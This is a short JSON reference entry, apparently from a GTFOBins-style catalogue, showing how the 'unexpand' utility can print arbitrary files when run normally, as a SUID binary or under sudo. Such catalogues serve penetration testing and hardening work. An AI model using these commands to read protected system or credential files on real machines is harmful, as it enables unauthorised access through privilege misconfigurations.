{
  "functions": {
    "file-read": [
      {
        "code": "LFILE=file_to_read\nunexpand -t99999999 \"$LFILE\"\n"
      }
    ],
    "suid": [
      {
        "code": "LFILE=file_to_read\n./unexpand -t99999999 \"$LFILE\"\n"
      }
    ],
    "sudo": [
      {
        "code": "LFILE=file_to_read\nsudo unexpand -t99999999 \"$LFILE\"\n"
      }
    ]
  }
}
